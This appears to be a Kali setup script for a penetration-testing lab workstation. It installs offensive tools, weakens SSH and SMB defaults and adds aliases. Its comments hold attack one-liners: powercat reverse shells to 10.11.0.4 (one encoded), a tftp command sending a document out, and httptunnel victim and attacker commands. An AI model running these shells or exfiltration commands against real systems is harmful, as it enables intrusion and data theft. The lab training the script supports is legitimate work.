# curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
# echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' | sudo tee /etc/apt/sources.list.d/docker.list

banner "Updating: APT"
sudo apt -y update

banner "Running APT upgrade"
confirm "Upgrade all packages (Default: N) [y/n]? " \
    && sudo apt -y upgrade

banner "Disabling APT auto-updates"
confirm "Disable auto updates (Default: N) [y/n]? " \
    && (gsettings set org.gnome.software download-updates false; sed -i "s/1/0/g" /etc/apt/apt.conf.d/20auto-upgrades)

banner "Updating: mlocate database" 
updatedb

banner "Installing: pip2 and pip3" 
sudo wget https://bootstrap.pypa.io/get-pip.py
sudo python2 get-pip.py
sudo python3 get-pip.py
sudo rm get-pip.py

banner "Installing: git" 
sudo apt install --no-upgrade git

banner "Installing: unzip" 
sudo apt install --no-upgrade unzip

banner "Installing: winrar" 
sudo apt install --no-upgrade unrar

banner "Installing: ftp" 
sudo apt install --no-upgrade ftp

banner "Installing: mdbtools" 
sudo apt install --no-upgrade mdbtools

banner "Installing: nfs-common" 
sudo apt install --no-upgrade nfs-common

banner "Installing: rinetd - port forwarding tool" 
sudo apt install --no-upgrade rinetd

banner "Installing: httptunnel" 
sudo apt install --no-upgrade httptunnel
# victim: hts --forward-port localhost:8888 1234
# attacker: htc --forward-port 8080 10.11.0.128:1234

banner "Installing: mingw-w64" 
sudo apt install --no-upgrade mingw-w64

banner "Installing: libc6-dev-i386" 
sudo apt install --no-upgrade libc6-dev
sudo apt install --no-upgrade libc6-dev-i386 

banner "Installing: winetricks" 
sudo apt install --no-upgrade wine winetricks

#sudo dpkg --add-architecture i386
#sudo apt update
#apt-get install --no-upgrade wine32

banner "Installing: winetricks python27" 
winetricks python27

banner "Installing: wine pip2 install pyinstaller7" 
wine pip2 install pyinstaller

banner "Installing python"
sudo apt install --no-upgrade python

#This is already done separately
#banner "Installing python-pip"
#sudo apt install --no-upgrade python-pip

banner "Installing: virtualenv over pip" 
sudo pip2 install virtualenv

banner "Installing: redis-tools" 
sudo apt install --no-upgrade redis-tools

if ! $useRecommended; then
    banner "Installing: exiftool" 
    sudo apt install --no-upgrade exiftool
fi

banner "Installing: snmp-mibs-downloader" 
sudo apt install --no-upgrade snmp-mibs-downloader
sed -i "s/mibs/#mibs/g" /etc/snmp/snmp.conf 

#banner "Updating: seclist" 
#sudo apt install seclists

#sudo apt install --no-upgrade pygmentize PIP?

banner "Updating: exploitdb" 
sudo apt install exploitdb

banner "Updating: metasploit-framework (Recommanded: N)" 
#msfupdate
if $useRecommended; then
    sudo apt install --no-upgrade metasploit-framework
else 
    confirm "Update metasploit (Default: N) [y/n]? " \
        && sudo apt install metasploit-framework
fi

banner "Updating: searchsploit" 
sudo searchsploit -u

banner "Updating: nmap-scripts"
sudo nmap --script-updated

banner "Adding PubkeyAcceptedKeyTypes ssh-dss to ssh_config (used in Debian OpenSSL Predictable PRNG (CVE-2008-0166))"
echo "More@: https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/SSH/key-exploit.md"
echo "More@: https://github.com/g0tmi1k/debian-ssh"
if ! grep -q "PubkeyAcceptedKeyTypes +ssh-dss" "/etc/ssh/ssh_config"; then
    sudo echo "PubkeyAcceptedKeyTypes +ssh-dss" >> /etc/ssh/ssh_config
fi 
 
banner "Fixing SMB/RPC - NT_STATUS_INVALID_PARAMETER"
echo "More@: https://forums.offensive-security.com/showthread.php?12943-Found-solution-to-enum4linux-rpcclient-problem-NT_STATUS_INVALID_PARAMETER/page2&highlight=NT_STATUS_INVALID_PARAMETER"
if ! grep -q "client min protocol = NT1" "/etc/samba/smb.conf"; then
    sed -i "s/workgroup = WORKGROUP/workgroup = WORKGROUP\n   client min protocol = NT1\n   client max protocol = SMB3\n   client use spnego = No/g" /etc/samba/smb.conf
fi

#mkdir -p share
#chmod 777 share
#adduser share

# apt-get update
# apt dist-upgrade #Reboot 
# apt install kali-linux-all #Reboot
# apt autoclean
# apt autoremove
# apt --fix-broken install

# Keyboard shortcuts
#banner "Adding aliases"
#if ! grep -q "SimpleHTTPServer" "/etc/profile.d/00-aliases.sh"; then
#/etc/profile.d/00-aliases.sh
cat <<EOT >> /tmp/00-aliases.sh
#!/bin/bash

    ## will prevent the need of exiting/reopening terminal after adding an alias
    refreshaliases='/etc/profile.d/00-aliases.sh'

    alias vpn='openvpn ~/Documents/OS-XXXXX-PWK.ovpn'
    alias htb='openvpn ~/Documents/htb.ovpn'
    alias rdp='rdesktop -g 85% -u offsec -p PASSWORD_HERE 10.11.14.134 &'
    alias mapshare='ln -s /mnt/hgfs/Pwn_Share/ /root/pwnshare'
    alias l='ls -la'
    alias webup='python -m SimpleHTTPServer 80'
    alias shieldsup='tcpdump -i tap0 -nnvv src net 10.11.0.0/24 and dst 10.11.0.54 -w - | tee capture.pcap | tcpdump -n -r -'
    alias ss='searchsploit $1'
    alias ssx='searchsploit -x $1'
    
    ## navigation
    alias gosetup='cd ~/Desktop/setup'
    alias gopublic='cd ~/Desktop/setup/public'
    alias godesktop='cd ~/Desktop/'
    # alias gopwk="cd /mnt/hgfs/VMShare/pwk/"
    # alias goexam="cd /mnt/hgfs/VMShare/pwk/exam/"
    # alias gopub="cd /mnt/hgfs/VMShare/pwk/lab/PUBLIC/"

    ## rdp to the offsec windows vm
    # alias offsecvm='rdesktop -u admin -p lab 192.168.23.111 -g 1366x768'
    # alias pwkconnect='openvpn /mnt/hgfs/VMShare/pwk/lab-connection/OS-39215-PWK.ovpn'

    ## a ssh tunnel i found myself having to use
    # alias proxy="echo password=Summer2018! && sshuttle -vr root@10.11.11.11 10.1.1.0/24"

    ## open a drag-to-select screenshot capture (mapped to hotkey)
    alias sc='gnome-screenshot -ac'

    ## software:
    # alias nosqlmap='python /mnt/hgfs/VMShare/software/NoSQLMap/nosqlmap.py'
    # alias rsactftool='/mnt/hgfs/VMShare/software/RsaCtfTool/RsaCtfTool.py'
    # alias nfsshell="/mnt/hgfs/VMShare/software/nfsshell/nfsshell"
    # alias knock="/usr/bin/python3 /mnt/hgfs/VMShare/software/knock/knock"
    # etc...

    ## mcd foldername - creates the folder and moves you into it. ty @brax <3
    mcd () { mkdir -p $1; cd $1; }
EOT
fi

#apt install --no-upgrade pure-ftpd
#groupadd ftpgroup
#useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome # use user offsec when logging into ftp
pure-pw mkdb
#n-me
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome # DIRECTORY HOSTING FILES
chown -R ftpuser:ftpgroup /ftphome/
service pure-ftpd stop

sudo apt install gobuster

#banner "Adding terminal twinks"
#if ! grep -q "last_dir" "~/.bashrc"; then
#cat <<EOT >> ~/.bashrc
## save path on cd
#function cd {
#    builtin cd $@
#    pwd > ~/.last_dir
#}
#
## restore last saved path
#if [ -f ~/.last_dir ]
#    then cd `cat ~/.last_dir`
#fi
#EOT

sudo apt install --no-upgrade atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
# sudo atftpd --daemon --port 69 /tftp
# tftp -i 10.11.0.4 put important.docx

#sudo apt-get install docker-ce

#sdkman
#java 11
#ghidra

#pure-ftpd
#export HISTTIMEFORMAT='%F %T '

#socat
#powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
#powercat -c 10.11.0.4 -p 443 -e cmd.exe
#powercat -l -p 443 -e cmd.exe
#standalong ps1 file encoded 
#powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell. ps1 

#reconng
#Gitrob or Gitleaks,

# Network scan
#nbtscan -r 10.11.1.0/24
#masscan -p80 10.0.0.0/8
#nmap -v -sn 10.11.1.1-254

#FoxyProxy
#Add Burp CA to browser

#### WINDOWS
#Mingw-w64

if ! grep -q "cdsetup" ~/.bashrc; then
cat <<EOT >> ~/.bashrc
alias cdsetup="cd ~/Desktop/setup"
alias cdpublic="cd ~/Desktop/setup/public"
alias cddesktop="cd ~/Desktop/"
alias cdauto="cd ~/Desktop/setup/tools/general/AutoRecon"
alias ll='ls -la'
alias rdp='rdesktop -g 85% -u offsec -p PASSWORD_HERE 10.11.14.134 &'
alias webup='python -m SimpleHTTPServer 80'
alias shieldsup='tcpdump -i tap0 -nnvv src net 10.11.0.0/24 and dst 10.11.0.54 -w - | tee capture.pcap | tcpdump -n -r -'
alias ss='searchsploit $1'
alias ssx='searchsploit -x $1'
mcd () { mkdir -p $1; cd $1; }
EOT
fi